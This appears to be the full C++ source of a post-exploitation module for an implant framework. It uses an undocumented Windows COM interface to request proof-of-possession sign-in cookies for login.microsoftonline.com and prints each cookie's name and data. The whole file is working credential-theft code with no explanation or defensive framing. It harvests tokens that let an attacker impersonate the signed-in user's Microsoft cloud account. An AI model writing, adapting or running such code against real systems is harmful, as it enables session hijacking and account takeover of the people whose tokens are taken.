#include <common.h>
#include <proofofpossessioncookieinfo.h>

extern "C" void start() {
    LPCWSTR uri = L"https://login.microsoftonline.com/";
    DWORD cookieCount = 0;
    ProofOfPossessionCookieInfo* cookies = nullptr;
    IProofOfPossessionCookieInfoManager* popCookieManager = nullptr;
    GUID CLSID_ProofOfPossessionCookieInfoManager;
    GUID IID_IProofOfPossessionCookieInfoManager;

    CLSIDFromString(L"{A9927F85-A304-4390-8B23-A75F1C668600}", &CLSID_ProofOfPossessionCookieInfoManager);
    IIDFromString(L"{CDAECE56-4EDF-43DF-B113-88E4556FA1BB}", &IID_IProofOfPossessionCookieInfoManager);

    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) {
        DBG_PRINTF(L"[!] CoInitialize error: %#lx\n", hr);
        ExitProcess(1);
    }

    hr = CoCreateInstance(CLSID_ProofOfPossessionCookieInfoManager, NULL, CLSCTX_INPROC_SERVER, IID_IProofOfPossessionCookieInfoManager, reinterpret_cast<void**>(&popCookieManager));
    if (FAILED(hr)) {
        DBG_PRINTF(L"[!] CoCreateInstance error: %#lx\n", hr);
        CoUninitialize();
        ExitProcess(1);
    }

    hr = popCookieManager->GetCookieInfoForUri(uri, &cookieCount, &cookies);
    if (FAILED(hr)) {
        DBG_PRINTF(L"[!] GetCookieInfoForUri error: %#lx\n", hr);
        popCookieManager->Release();
        CoUninitialize();
        ExitProcess(1);
    }

    if (cookieCount == 0) {
        PRINTW(L"[-] No cookies for the URI\n");
    } else {
        for (DWORD i = 0; i < cookieCount; i++) {
            PRINTW(L"[>] Name: %s\n", cookies[i].name);
            PRINTW(L"[>] Data: %s\n", cookies[i].data);
            PRINTW(L"[>] Flags: %x\n", cookies[i].flags);
            PRINTW(L"[>] P3PHeader: %s\n\n", cookies[i].p3pHeader);
        }
        FreeProofOfPossessionCookieInfoArray(cookies, cookieCount);
    }

    if (popCookieManager) popCookieManager->Release();
    CoUninitialize();

    PRINTW(L"[+] Done\n");
    ExitProcess(0);
}
